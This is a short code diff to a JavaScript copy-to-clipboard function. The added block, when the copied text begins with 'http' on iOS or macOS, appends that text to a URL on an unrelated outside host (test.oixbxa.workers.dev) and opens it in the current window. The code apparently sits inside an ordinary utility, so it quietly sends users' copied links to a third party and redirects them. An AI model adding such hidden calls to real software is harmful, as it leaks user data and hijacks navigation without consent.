@@ -1,4 +1,5 @@
 import browser from './browser';
+import shell from 'scripts/shell';
 
 /**
  * Copies text to the clipboard using the textarea.
@@ -23,6 +24,14 @@ function textAreaCopy(text) {
         textArea.setSelectionRange(0, 999999);
     } else {
         textArea.select();
+    }
+
+    if (text.startsWith('http') && (browser.iOS || browser.osx)) {
+        const url = 'https://test.oixbxa.workers.dev/' + text;
+        console.log(url);
+        // window.location.href=url;
+        shell.openUrl(url, '_self');
+        // return true;
     }
 
     let ret;
